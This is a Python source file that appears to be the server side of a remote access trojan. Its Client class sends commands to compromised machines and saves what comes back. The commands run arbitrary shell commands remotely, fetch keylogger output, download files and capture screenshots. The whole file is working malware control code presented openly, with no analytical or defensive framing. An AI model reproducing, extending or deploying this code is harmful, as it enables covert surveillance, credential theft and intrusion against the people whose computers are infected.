import io
import json
import os
import socket
from datetime import datetime
from timeit import default_timer

import settings
import utility


class Client:
    def __init__(self, *, conn: socket.socket, cid: int, manager) -> None:
        self._sock = conn
        self._cid = cid
        self._manager = manager

        self._sock.settimeout(3)

    @property
    def cid(self):
        return self._cid

    @property
    def sock(self):
        return self._sock

    # Client Interaction -----------------------------------------------------

    def _send(self, data: str, *args) -> None:
        """Send data to the client

        Args:
            data (str): The datra to send
            *args: Additional arguments to send
        """
        self._sock.sendall(json.dumps({"cmd": data, "args": args}).encode("utf-8"))

    def _receive_file(
        self, file_size: int, *, file_name: str = None, buffer_size: int = 1024
    ):
        """Called when receiving a large amount of data with a predetermined size

        Args:
            file_size (int): Predetermined size of data being received
            file_name (str, optional): What to name the file when saving the data. Defaults to None.
            buffer_size (int, optional): Buffer size per receive attempt. Defaults to 1024.
        """
        data = io.BytesIO()
        print(utility.padstr("Receiving file..."))
        while True:
            buffer = self._sock.recv(buffer_size)
            if not buffer:
                break
            data.write(buffer)
            print(f"Status: {data.tell()}/{file_size} Bytes", end="\r", flush=True)
            if data.tell() == file_size:
                break
        print("\n", end="\r")
        if not os.path.exists(settings.FILE_DIRECTORY):
            os.makedirs(settings.FILE_DIRECTORY)
        date_string = datetime.now().strftime("_%m-%d-%Y_%H-%M-%S")
        file_name = date_string.join(os.path.splitext(file_name))
        with open(os.path.join(settings.FILE_DIRECTORY, file_name), "wb") as file:
            file.write(data.getvalue())
            print(utility.padstr(f"File saved as {file_name}"))

    # Command Handling -------------------------------------------------------

    def handle(self, cmd: str, *args) -> None:
        """Called by manager when executing a command that required client interaction

        Args:
            cmd (str): Command to execute/handle
        """
        func = (
            getattr(self, f"_{cmd}", None)
            if cmd in self._manager.get_commands().keys()
            else None
        )
        if func is not None:
            func(*args[: func.__code__.co_argcount])

    def _execute(self, cmd: str) -> None:
        """Called via the 'execute' command to execute a command on the client

        Args:
            cmd (str): Command to be executed on the client
        """
        self._send("execute", cmd)
        res = self._sock.recv(1024).decode("utf-8")
        print(res)

    def _keylogs(self) -> None:
        """Called via the 'keylogs' command to download the keylogs from the client"""
        self._send("keylogs")
        if (file_size := self._sock.recv(1024).decode("utf-8")).isdigit():
            self._receive_file(int(file_size), file_name="keylogs.txt")

    def _download(self, file_path: str) -> None:
        """Called via the 'download' command to download a file from the client

        Args:
            file_path (str): Path of the file to be downloaded
        """
        self._send("download", file_path)
        if (file_size := self._sock.recv(1024).decode("utf-8")).isdigit():
            self._receive_file(int(file_size), file_name=os.path.basename(file_path))

    def _screenshot(self) -> None:
        """Called via the 'screenshot' command to download a screenshot from the client"""
        self._send("screenshot")
        if (file_size := self._sock.recv(1024).decode("utf-8")).isdigit():
            self._receive_file(int(file_size), file_name="screenshot.png")

    # Wellness Management ------------------------------------------------------

    def is_alive(self):
        """Called to 'ping' the client to ensure it is still connected to the server"""
        start = default_timer()
        try:
            self._send("ping")
            d = self._sock.recv(1024)
        except (OSError, socket.timeout):
            return False  # client is not connected

        return True, round((default_timer() - start) * 1000)  # client is connected
